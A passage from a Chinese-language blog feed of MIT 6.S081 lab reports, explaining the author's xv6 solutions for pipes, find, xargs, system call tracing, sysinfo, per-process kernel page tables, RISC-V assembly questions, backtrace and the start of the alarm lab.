class="number">0</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">     close(p[<span class="number">0</span>]);</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tot; i ++)</span><br><span class="line">         write(p[<span class="number">1</span>], a + i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">     close(p[<span class="number">1</span>]);</span><br><span class="line">     <span class="keyword">int</span> status; wait(&amp;status);</span><br><span class="line">     <span class="keyword">if</span> (status != <span class="number">0</span>) exit_error();</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这样做有一个关键的问题：每一层进程都是完全接收了上一层的数，做完筛法i，再把所有的数传给下一层进程，没有使筛法充分并行起来。</p>
<p>真正并发/并行的做法是：每个进程有一个管道和父亲通信，另开一个管道和自己的子进程通信。每从自己的父进程接收到一个数就立刻传给自己的子进程。这样的话，比如在第一层进程中 5 通过了 2 的筛查，被传入了第二层，然后第一层进程在筛查 6，7，8，9… 的时候，第二层进程已经在用 3 筛查 5 了，这样真正做到了并行。将递归与这个过程结合起来写代码会非常舒服，否则需要维护一大堆管道的编号，使编码变复杂。</p>
<p>需要注意的一点是管道的使用。父进程在给子进程传递完数据后，一定要先关闭管道的输出端再调用 <code>wait()</code> ，否则子进程的 <code>read()</code> 在管道输出没有被全部关闭的情况下是不会退出的。</p>
<h2 id="find-moderate"><a href="#find-moderate" class="headerlink" title="find (moderate)"></a>find (moderate)</h2><p>参考 <code>ls</code> 程序的实现可以对 <code>find</code> 的实现起到很大的帮助。</p>
<p><code>find</code> 的实现需要对 xv6 的文件系统有一个粗浅的了解。以下知识是对该任务的实现有帮助的：</p>
<ul>
<li><p>当我们拿到一个文件时，可以用 <code>fstat()</code> 系统调用来获取它的信息。<code>fstat()</code> 系统调用将文件信息写到作为参数的 stat 结构体中，stat 结构体的 type 参数刻画了这是一个文件，文件夹还是设备。</p>
</li>
<li><p>在通俗的观念中，文件夹是一个“容器”，里面放了很多的文件。但事实上文件夹本身也是一个文件。按照 xv6 的 <code>/kernel/fs.h</code> 中所说，”Directory is a file containing a sequence of dirent structures.” dirent 结构体的定义如下：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIRSIZ 14</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> inum;</span><br><span class="line">    <span class="keyword">char</span> name[DIRSIZ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  inum 是该文件占据的 inode 的个数，我们不必访问那些 inum 为 0 的文件。name 是文件名，在 xv6 中，我们默认文件名不超过 14 个字节。因此在 open 了一个文件夹文件后，我们只要不断用 <code>read(fd, &amp;de, sizeof(dirent))</code> 命令来读取信息，就可以获得文件夹内所有文件的文件名。将文件名和之前的路径拼接起来，就可以访问文件夹内部的文件。</p>
</li>
<li><p>可以用递归来实现文件夹内部文件的访问，但不要对 <code>.</code> 和 <code>..</code> 递归，否则会造成死递归。</p>
</li>
</ul>
<p>笔者最初实现完发现文件系统后面的若干的文件都显示 <code>find: cannot open ...</code>，经过筛查发现这是因为没有多余的文件描述符可以使用了。在 xv6 中，资源比较有限，<strong>我们应该养成打开一个文件，读取完相关信息就关闭它的好习惯</strong>。</p>
<h2 id="xargs-moderate"><a href="#xargs-moderate" class="headerlink" title="xargs (moderate)"></a>xargs (moderate)</h2><p>有一些命令不支持从管道读取输入，而 <code>xargs</code> 命令可以帮助这些命令从管道读取信息。注意：管道的创建和输出输入的重定向是由 shell 来完成的，我们的 xargs 程序无需关心输入的来源，只需要从标准输入 (文件描述符 1) 读取信息即可。</p>
<p>为新命令准备参数的环节是较好的 C 语言指针练习。笔者新建了一个 <code>char *child_args[MAXARG]</code> 数组来为子进程传递参数。xargs 后紧跟的那几个参数是确定的，再后面的参数需要读入，目前还不能确定长度，所以应该在读取完之后用 <code>malloc()</code> 来申请内存空间，并在子进程执行完成后用 <code>free()</code> 释放空间防止内存泄漏。为了能够准确识别到 <code>\n</code> 以执行多条指令，笔者采取了一个字符一个字符地从标准输入读取信息的方式。读取到的字符暂存在局部数组 buf 中，一旦遇到 ‘ ‘ 或 ‘\n’ 就根据 buf 的长度申请内存，将 buf 复制到参数数组里。</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lab 02: System calls</title>
    <url>/2022/01/27/MIT-6.S081%20Lab%2002%20-%20System%20calls/</url>
    <content><![CDATA[<h2 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h2><ul>
<li><input checked="" disabled="" type="checkbox"> System call tracing (moderate)</li>
<li><input checked="" disabled="" type="checkbox"> Sysinfo (moderate)</li>
</ul>
<span id="more"></span>

<h2 id="System-call-tracing-moderate"><a href="#System-call-tracing-moderate" class="headerlink" title="System call tracing (moderate)"></a>System call tracing (moderate)</h2><p>该实验可以对 xv6 中系统调用的过程有一个大致的了解。</p>
<p>在 <code>/user/trace.c</code> 中，程序解析了 <code>trace()</code> 后的所有，将 trace 之后的那一个数字作为 trace 的参数，剩下的作为另外的一条命令调用 <code>exec()</code>。</p>
<p><code>trace()</code> 函数是用 assembly 写的，由 <code>/user/usys.pl</code> 生成。<code>/user/usys.pl</code> 是一个脚本，内容如下：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate usys.S, the stubs for syscalls.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;# generated by usys.pl - do not edit\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">entry</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $name = <span class="keyword">shift</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;.global $name\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$&#123;name&#125;</span>:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot; li a7, SYS_<span class="subst">$&#123;name&#125;</span>\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot; ecall\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot; ret\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">entry(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>对于每一个系统调用，它会生成一个函数，将系统调用号 SYS_name 放到 <code>a7</code> 寄存器中，然后使用 <code>ecall</code> 陷入内核。根据 calling convention，剩下的系统调用参数放在 <code>a0</code> <code>a1</code> …… 寄存器中，因为和 <code>trace.c</code> 中准备参数的过程相同，所以不需要额外再做一次参数准备。</p>
<p>硬件提升完特权级后，根据 <code>stvec</code> 寄存器的值进行地址跳转，<code>stvec</code> 内保存的地址是 <code>/kernel/trampoline.S</code> 中的 <code>uservec</code>。<code>uservec</code> 是用 assembly 写的，保存了上下文，并跳转到 <code>/kernel/trap.c</code> 中的函数 <code>usertrap</code>。<code>usertrap</code> 根据 <code>scause</code> 寄存器的值，认定这是一个系统调用，于是转到 <code>/kernel/syscall.c</code> 中的函数 <code>syscall</code>。</p>
<p><code>syscall</code> 根据 <code>a7</code> 寄存器的值获取系统调用号，并执行相应的系统调用服务程序（所有的服务程序都存在 syscalls[] 数组中）。</p>
<p>对于 <code>trace()</code> 系统调用来说，我们需要注册一个函数 <code>sys_trace()</code> 。xv6 提供了一系列函数来获取系统调用的参数（本质上是根据 calling convention 提取寄存器的值），<code>argint()</code> 用于获取值，<code>argaddr()</code> 用于获取地址，<code>argstr()</code> 用于获取字符串（本质上是对寄存器的值进行了不同的类型解释）。我们需要在 proc 结构体中新定义一个变量来存储 trace mask，将参数取出放进这个变量即可。</p>
<p>此外，在 <code>syscall</code> 中，每执行完一个系统调用准备返回时，我们要根据 trace mask 决定是否将其相关的信息打印。我们需要额外准备一个数组存储所有系统调用的名字，进程号可以通过 p-&gt;pid 获得。</p>
<p>根据讲义的定义，父进程 fork 出的子进程要继承 trace mask，因此需要修改一下 fork 函数的代码，将 p-&gt;tMask 复制给 np-&gt;tMask 即可。</p>
<h2 id="Sysinfo-moderate"><a href="#Sysinfo-moderate" class="headerlink" title="Sysinfo (moderate)"></a>Sysinfo (moderate)</h2><p>该实验与上一个实验的主要不同在于：</p>
<ul>
<li><p><code>sysinfo(struct sysinfo *)</code> 系统调用需要将信息写回到 user space 的结构体中，因此需要从 kernel space 向 user space 复制信息，可以参考 <code>fstat()</code> 系统调用的实现来运用 <code>copyout()</code> 函数，由于目前还未实现虚拟存储相关细节，故不深究 <code>copyout()</code> 的具体原理。</p>
</li>
<li><p>当前进程的个数很好统计，进程信息保存在 <code>/kernel/proc.c</code> 的 proc[] 数组里，proc[] 数组的每个元素是一个 proc 结构体，只要结构体的 state 变量不是 UNUSED 就是一个当前的进程。</p>
</li>
<li><p>当前剩余的内存统计稍为复杂。xv6 实现了分页机制，<code>/kernel/kalloc.c</code> 负责物理内存的分配和释放。具体的组织形式和各个函数的意义见 Xv6 源码解读手册。</p>
<p>  要实现剩余内存的统计，我们只要数一数 freelist 链表中有多少个页面即可。可以每次现场数一遍，也可以维护一个变量，在 <code>kalloc()</code> 和 <code>kfree()</code> 的时候动态统计空闲页面的个数。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lab 03: Page tables</title>
    <url>/2022/01/28/MIT-6.S081%20Lab%2003%20-%20Page%20tables/</url>
    <content><![CDATA[<h2 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h2><ul>
<li><input checked="" disabled="" type="checkbox"> Print a page table (easy)</li>
<li><input checked="" disabled="" type="checkbox"> A kernel page table per process (hard)</li>
<li><input checked="" disabled="" type="checkbox"> Simplify <code>copyin/copyinstr</code> (hard)</li>
</ul>
<span id="more"></span>

<h2 id="Print-a-page-table-easy"><a href="#Print-a-page-table-easy" class="headerlink" title="Print a page table (easy)"></a>Print a page table (easy)</h2><p>在 <code>/kernel/vm.c</code> 中新建一个函数 vmprint() 用于打印页表信息。为了方便编码，笔者在 <code>/kernel/vm.c</code> 中又定义了一个函数 vmprint_recursive()，该函数不仅接收页表地址，还接收一个 layer 参数，用于确定打印信息时在前面加多少组 <code>..</code>。vmprint_recursive() 遍历传入页表的 512 个页表项，如果页表项的 PTE_V 位为 1 (页表存在) ，则打印页表项的值和其对应的物理地址。如果当前页表项不是底层页表项 (叶子节点)，就递归地继续打印。我们可以根据页表项的标志信息来判断它是不是叶子节点：叶子节点的页表项除了 PTE_V 还会有其他的 RWXU 等权限位，而各级页目录页表项只有 PTE_V 为 1。</p>
<blockquote>
<p>Explain the output of <code>vmprint</code> in terms of Fig 3-4 from the text.  What does page 0 contain? What is in page 2? When running in user mode, could the process read/write the memory mapped by page 1?</p>
</blockquote>
<p>第 0 个页面存储了用户的代码段和数据段，第 2 个页面是用户栈。在用户态下，进程不能读写第 1 个页面，因为根据第一个页面的页表项，其 PTE_U 位为 0，用户态无访问权限 (第 1 个页面是用户栈下方的保护页面，在创建后通过 uvmclear() 函数清除了 PTE_U 位)。</p>
<h2 id="A-kernel-page-table-per-process-hard"><a href="#A-kernel-page-table-per-process-hard" class="headerlink" title="A kernel page table per process (hard)"></a>A kernel page table per process (hard)</h2><blockquote>
<p>根据 RISC-V 架构的约定，page table walk 的工作理应交给硬件完成，那么为什么 xv6 中要有 walkaddr() 这样的函数来在软件层面进行 page table walk呢？</p>
</blockquote>
<p>xv6 中当用户陷入内核态时，satp 寄存器会切换到内核页表。内核页表中只有内核部分的映射，因此在内核态中如果想要访问用户内存中的数据，就必须在软件层面进行虚拟地址的翻译：抓着用户页表和用户虚拟地址调用 walkaddr() 函数获得物理地址，再拿着物理地址进行操作 (内核页表是恒等映射，因此这个物理地址也可以当做 “虚拟地址” 使用)。</p>
<p>该实验部分和下一个实验部分的目的是：为每一个进程创建一个“用户内核页表”。该页表的内核部分映射与内核页表相同，用户部分映射与用户页表相同。这样用户进程从用户态陷入内核态时，不再切换到内核页表，而是切换到本进程的“用户内核页表”，这样在内核中执行操作时，页表中包含用户部分的映射，用户部分虚拟地址的翻译就可以交给硬件做了。</p>
<p>该实验部分主要负责完成用户内核页表的内核部分的映射。根据提示内容，</p>
<blockquote>
<p>Add a field to <code>struct proc</code> for the process’s kernel page table.   </p>
</blockquote>
<p>在 <code>struct proc</code> 中添加一个 pagetable_t 类型的变量 k_pagetable 来存储用户内核页表。</p>
<blockquote>
<p>A reasonable way to produce a kernel page table for a new process  is to implement a modified version of <code>kvminit</code> that makes  a new page table instead of modifying <code>kernel_pagetable</code>.  You’ll want to call this function from <code>allocproc</code>.   </p>
</blockquote>
<p>笔者起初认为：为什么不让每个进程的 k_pagetable 直接指向 kernel_pagetable 呢？这样就省去了为每个进程做映射的工作？如果理解了整个实验的目的，我们就会明白这是不合理的。我们的目的不仅是完成内核映射，还要让这份页表同时拥有该进程的用户映射，内核中的原始份内核页表无法将各个进程的用户映射都存下来 (彼此冲突)。这样做也许可以通过这个实验部分，但将在下一个实验部分走入死胡同。</p>
<p>正确的做法是仿照 kvminit() 函数写一份初始化映射，将页表基地址保存在 p-&gt;k_pagetable 中。allocproc() 函数在 userinit() 和 fork() 中被调用，负责创建一个新进程。我们在 allocproc() 中调用用户内核页表的初始化映射函数即可。</p>
<blockquote>
<p>Make sure that each process’s kernel page table has a mapping  for that process’s kernel stack. In unmodified xv6, all the  kernel stacks are set up in <code>procinit</code>. You will need to  move some or all of this functionality to <code>allocproc</code>.   </p>
</blockquote>
<p>笔者没有动 procinit() 的代码，即内核页表中有所有进程内核栈的映射，并准备在每个进程的用户内核页表中映射自己进程的内核栈地址。这里笔者犯的错误是：在 allocproc() 中又 kalloc() 了一个新的页面作为用户栈。这样用户内核页表中的用户栈和内核页表中的用户栈实际上指向了不同的物理页面实体。我们要时刻记住<strong>用户内核页表只应该复制映射，映射应该指向相同的实体</strong>，这样陷入内核态之后才能看到页面中的改变。</p>
<blockquote>
<p>Modify <code>scheduler()</code> to load the process’s kernel page table into  the core’s <code>satp</code> register (see <code>kvminithart</code> for  inspiration). Don’t forget to call <code>sfence_vma()</code>  after calling <code>w_satp()</code>.   </p>
<p><code>scheduler()</code> should use <code>kernel_pagetable</code> when  no process is running.   </p>
</blockquote>
<p>这是笔者感到迷茫的部分，因为根据课程 schedule 的进度，做该实验时理应还没有看中断部分的内容，所以笔者对 scheduler() 函数的意义很不了解。经过大致的摸索，核心循环</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">  acquire(&amp;p-&gt;lock);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;state == RUNNABLE) &#123;</span><br><span class="line">    <span class="comment">// Switch to chosen process.  It is the process&#x27;s job</span></span><br><span class="line">    <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">    <span class="comment">// before jumping back to us.</span></span><br><span class="line">    p-&gt;state = RUNNING;</span><br><span class="line">    c-&gt;proc = p;</span><br><span class="line">    swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process is done running for now.</span></span><br><span class="line">    <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">    c-&gt;proc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    found = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>负责找到第一个处于 RUNNABLE 状态的进程，然后将其状态设置为 RUNNING，并通过 swtch() 函数切换过去。也就是说，执行完 swtch 之后，xv6 就会转去执行进程 p (此时仍然在内核态中)，因此应该在 swtch() 之前将 satp 寄存器改写为 p 进程的用户内核页表。</p>
<p>一个进程运行完毕后，会返回到 swtch 的下一条语句执行，这时候 CPU 核处于没有进程运行的状态。因此应该在 swtch() 之后调用 kvminithart() 函数将 satp 寄存器改写为内核页表。</p>
<blockquote>
<p>Free a process’s kernel page table in <code>freeproc</code>.  </p>
<p>You’ll need a way to free a page table without also freeing the leaf physical memory pages.   </p>
</blockquote>
<p>freeproc() 函数负责进程的释放。其中 proc_freepagetable() 函数负责将该进程的用户页表释放。我们需要再写一个函数将用户内核页表也释放。注意用户内核页表的实体是那些内核物理页面和该进程的用户物理页面。该进程的用户物理页面已经随着用户页表的释放而释放了，而内核物理页面不能被释放，否则内核代码就消失了。因此我们不能直接调用 proc_freepagetable()，而要再写一个 proc_freekpagetable()。</p>
<p>此外，proc_freepagetable() 中调用的 freewalk() 函数负责递归地释放所有的页表页面，该函数默认底层的物理页面已经被释放，如果不符合要求会触发 kernel panic。但在用户内核页表页面的释放过程中底层的 (内核) 物理页面是没有被释放的，因此不能直接调用 freewalk() 函数，而要仿照它再写一个不会对底层物理页面存在报错的 kfreewalk()。</p>
<h2 id="Simplify-copyin-copyinstr-hard"><a href="#Simplify-copyin-copyinstr-hard" class="headerlink" title="Simplify copyin/copyinstr (hard)"></a>Simplify <code>copyin/copyinstr</code> (hard)</h2><p>该实验部分承接上一个实验部分，要补全用户内核页表的用户部分的映射。我们只要做到 xv6 中任何对用户页表有修改的地方，我们在用户内核页表中将这些修改的映射抄一份即可。这里务必要注意的一点是：<strong>用户页表中会申请新的物理页面，但我们不应该在用户内核页表中也申请新的页面，而是应该映射到用户页表申请的物理页面</strong>。只有这样我们才能在陷入内核态时访问到用户态时保存的数据。</p>
<p>xv6 涉及用户页表修改的有三处：fork()，exec()，和 growproc()。</p>
<ul>
<li><p>fork() 函数会申请一个新的进程，调用 uvmcopy() 函数将父进程的用户页表复制给子进程的用户页表。注意：我们不能调用 uvmcopy() 来将父进程的用户页表内容复制到子进程的用户内核页表。因为父进程和子进程互相独立，所以 uvmcopy() 在复制的时候不仅复制页表内容，所有底层的物理页面也申请了新的并复制了一遍 (在 copy-on-write fork 中这一点会得到改善)。我们的用户内核页表是不应该将底层物理页面复制的。<strong>子进程的用户内核页表一定要抄子进程的用户页表，映射到子进程的用户页表的物理页面上</strong>。</p>
</li>
<li><p>exec() 函数根据 ELF 文件创建了一个新的内存镜像，并用新的页表替换旧的页表。在用户进程页表中我们也应该进行相对应的更新：首先将旧页表相关的映射删除 (这里需要格外小心的一点是：exec() 调用 proc_freepagetable() 释放旧页表时，已经将旧页表的底层物理页面一并释放了，我们在删除用户内核页表中的旧页表内容时，不需要再释放一遍底层物理页面，只需要清除相关的页表项即可。)，然后将新页表的映射抄进用户内核页表。</p>
</li>
<li><p>growproc() 函数根据 n 的正负分别调用 uvmalloc() 和 uvmdealloc() 来调整用户内存的大小。我们在用户内核页表中也应该进行相对应的更新。对于 uvmalloc() 来说，要注意用户内核页表要映射到用户页表创建的那些物理页面中，为此笔者写了一个类似于 uvmcopy() 的函数来进行复制。对于 uvmdealloc() 来说，要注意用户页表负责释放底层物理页面，用户内核页表不能做重复的事。</p>
<p>  (注：内核部分映射和用户部分映射可以合二为一的重要前置条件是两者没有重复的映射。根据 xv6 手册，低于 0x80000000 的很多部分的内存是作为外设地址的。因此用户实际可用的内存空间其实远小于 MAXVA。式样讲义规定用户只能使用 PLIC 以下的地址。但事实上 CLINT 映射的地址比 PLIC 还要低，实验证明如果不取消 CLINT 的映射，用户内存会覆盖到这部分，触发 ‘remap’ kernel panic。因此笔者只能在用户内核页表的映射中将 CLINT 移除。)</p>
</li>
</ul>
<blockquote>
<p>What permissions do the PTEs for user addresses need in a process’s kernel page table?  (A page    with <code>PTE_U</code> set cannot be accessed in kernel mode.)     </p>
</blockquote>
<p>用户内核页表的页表项不能照抄用户页表，因为 QEMU 模拟的 RISC-V 硬件在内核态下是不能访问带有 PTE_U 位的页面的。因此用户内核页表的底层页表项都要将 PTE_U 挖去。</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lab 04: Traps</title>
    <url>/2022/01/31/MIT-6.S081%20Lab%2004%20-%20Traps/</url>
    <content><![CDATA[<h2 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h2><ul>
<li><input checked="" disabled="" type="checkbox"> RISC-V assembly (easy)</li>
<li><input checked="" disabled="" type="checkbox"> Backtrace (moderate)</li>
<li><input checked="" disabled="" type="checkbox"> Alarm (hard)</li>
</ul>
<span id="more"></span>

<h2 id="RISC-V-assembly-easy"><a href="#RISC-V-assembly-easy" class="headerlink" title="RISC-V assembly (easy)"></a>RISC-V assembly (easy)</h2><blockquote>
<p><strong>Q: Which registers contain arguments to functions?  For example, which register holds 13 in main’s call to <code>printf</code>?</strong>  </p>
</blockquote>
<p>RISC-V 中，函数调用的参数按顺序存放在 <code>a0</code> <code>a1</code> <code>a2</code> <code>a3</code> …… 中。以 printf() 为例，13 是它的第三个参数，所以存放在 <code>a2</code> 寄存器中。</p>
<blockquote>
<p><strong>Q: Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>?  (Hint: the compiler may inline functions.)</strong>  </p>
</blockquote>
<p>汇编代码中没有直接调用函数 f() 和 g()，因为 f() 和 g() 是非常简单的函数，编译器对其做了优化，直接将 <code>f(8)+1</code> 的结果 12 写入了寄存器 <code>a1</code>。</p>
<blockquote>
<p><strong>Q: At what address is the function <code>printf</code> located?</strong>  </p>
</blockquote>
<p>printf() 函数的地址为 0x628。可以在 <code>call.asm</code> 中直接搜索到，也可以通过 main() 函数的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">30:	00000097          	auipc	ra,0x0</span><br><span class="line">34:	5f8080e7          	jalr	1528(ra) # 628 &lt;printf&gt;</span><br></pre></td></tr></table></figure>

<p>看出 printf() 函数的地址。</p>
<blockquote>
<p><strong>Q: What value is in the register <code>ra</code> just after the <code>jalr</code> to <code>printf</code> in <code>main</code>?</strong>  </p>
</blockquote>
<p><code>ra</code> 寄存器中存储的应该是 printf() 函数的返回地址。根据 RISC-V 手册中 <code>jalr</code> 指令的定义，pc+4 的值会被写入 <code>ra</code> 寄存器。因此当前 <code>ra</code> 的值为 0x38。</p>
<blockquote>
<p><strong>Q: Run the following code.</strong>      </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0x00646c72</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;H%x Wo%s&quot;</span>, <span class="number">57616</span>, &amp;i);</span><br></pre></td></tr></table></figure>

<p><strong>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</strong>     </p>
<p><strong>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</strong></p>
<p><strong><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</strong>    </p>
</blockquote>
<p>输出的结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">He110 World</span><br></pre></td></tr></table></figure>

<p>第一，十进制数 57616 转换成十六进制是 E110H。使用 “%x” 打印时，十六进制中的字母都是小写字母，所以第一处打印结果为 e110。</p>
<p>第二，变量 i 的地址被传给了 printf()，printf() 会将该地址处的数据按照字符串类型进行解读，即每个字节按照 ASCII 码翻译成字符进行输出。RISC-V 是小端机器，因此地址 &amp;i 处往后若干个字节的内容为</p>
<table>
<thead>
<tr>
<th>&amp;i</th>
<th>&amp;i + 1</th>
<th>&amp;i + 2</th>
<th>&amp;i + 3</th>
</tr>
</thead>
<tbody><tr>
<td>72 $\rightarrow$ ‘r’</td>
<td>6c $\rightarrow$ ‘l’</td>
<td>64 $\rightarrow$ ‘d’</td>
<td>00 $\rightarrow$ ‘\0’</td>
</tr>
</tbody></table>
<p>遇到结束符即停止输出，因此第二处打印结果为 rld。</p>
<p>如果 RISC-V 是大端机器，为了使第二处输出结果不变，i 的值应该修改为 0x726c6400。第一处的 57616 不需要修改，因为只要存和取都遵循大端方式，数据的值就不会改变。</p>
<blockquote>
<p><strong>Q: In the following code, what is going to be printed after <code>&#39;y=&#39;</code>?  (note: the answer is not a specific value.)  Why does this happen?</strong>       </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x=%d y=%d&quot;</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>y=</code> 后的内容是进入 printf() 函数后 <code>a2</code> 寄存器中的值。由于这里的 printf() 函数少了一个参数，<code>a2</code> 寄存器中的值是 UB，输出结果会是一个无法预料的随机数。</p>
<h2 id="Backtrace-moderate"><a href="#Backtrace-moderate" class="headerlink" title="Backtrace (moderate)"></a>Backtrace (moderate)</h2><p>要实现的 Backtrace 功能和 GDB 中的 backtrace 基本相同：根据栈帧内容回溯函数调用的过程。</p>
<p>首先需要获取当前函数的栈帧。sp 寄存器指向栈顶，但栈帧的大小是不确定的，我们需要的是栈底指针 fp (即 s0 寄存器)。可以通过内联汇编的方式来读取 fp 寄存器的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> uint64</span></span><br><span class="line"><span class="function"><span class="title">r_fp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;mv %0, s0&quot;</span> : (=r) (x))</span></span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于现在处在内核态，当前的栈帧存储在上一个用户进程的内核栈上。内核栈大小为一个页面，可以通过 <code>PGROUNDDOWN(fp)</code> 和 <code>PGROUNDUP(fp)</code> 来分别获得内核栈的栈顶地址和栈底地址。我们的函数回溯追踪只在内核栈范围内，因为更远的回溯会到用户栈上。</p>
<p>根据 RISC-V 的栈帧格式，fp 指针实际上指向的是上一个栈帧的底部 (课程中 TA 的说法有误)。在 RV64 中，fp-8 的位置存储了当前函数的返回地址，这个地址理应在当前函数的 caller 函数范围内，打印这个地址就相当于追踪到了上一个函数。fp-16 的位置存储了上一个栈帧的 fp 的内容。将这个值赋给 fp 即可实现顺着栈帧向上爬的功能。</p>
<blockquote>
<p><strong>关于 printf() 的输出不能得到正确的结果</strong></p>
<p>笔者起初使用 printf() 的 <code>%x</code> 来输出返回地址，但得到的结果出入很大。xv6 中的 printf() 不是调用的 C 库函数，而是自己实现的。阅读 printf() 的源码可以看到，<code>%x</code> 输出十六进制数只能输出 int 范围内的。要打印一个地址应该使用 <code>%p</code> 模式来输出。</p>
</blockquote>
<h2 id="Alarm-hard"><a href="#Alarm-hard" class="headerlink" title="Alarm (hard)"></a>Alarm (hard)</h2><p>我们需要实现两个系统调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigalarm</span><span class="params">(<span class="keyword">int</span> ticks, <span class="keyword">void</span> (*handler)())</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigreturn</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>sigalarm()</code> 负责在当前进程中打开一个定时器，每过 ticks 个周期就执行一次 handler 函数。为了实现这个功能，我们需要在 proc 结构体中添加一些字段：nticks 负责存储当前的周期，handler 负责存储回调函数的地址 (用户虚拟地址)，curticks 负责记录自上一次调用 handler 之后，已经过了多少个周期。在 sys_sigalarm() 函数中，我们应当更新这些字段。</p>
<p>此处的周期指的不是 CPU 的时钟周期，而是指时钟中断的周期。因此在 usertrap() 函数中，每次判断到 <code>which_dev == 2 </code>，即时钟中断到来，则 <code>curticks++</code>，若 curticks 达到了 nticks，则下一次返回用户态应转移到回调函数。sepc 寄存器决定了返回用户态时的地址，因此只要将 handler 赋给 p-&gt;trapframe-&gt;epc 即可。</p>
<p>回调函数的最后一定会使用 <code>sigreturn()</code> 系统调用，该系统调用负责回到原本用户程序的中断处继续执行。触发了回调函数的这次中断走过的路程应该是这样的：</p>
<p>​        用户程序 $\overset{时钟中断}{\rightarrow}$ 内核 $\rightarrow$ 回调函数 $\overset{系统调用}{\rightarrow}$ 内核 $\rightarrow$ 用户程序</p>
